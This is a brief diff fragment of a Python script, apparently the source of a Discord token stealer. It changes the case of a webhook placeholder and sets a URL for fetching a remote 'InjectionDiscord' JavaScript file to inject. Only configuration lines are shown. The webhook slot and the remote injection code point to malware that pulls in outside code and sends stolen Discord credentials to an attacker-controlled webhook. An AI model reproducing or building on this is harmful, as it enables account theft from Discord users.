@@ -2,7 +2,7 @@ import os
 import requests
 
 
-wh00k = "%Webhook%"
+wh00k = "%WEBHOOK%"
 
 inj_url = "https://raw.githubusercontent.com/ZekromDev/InjectionDiscord/main/index.js"
 
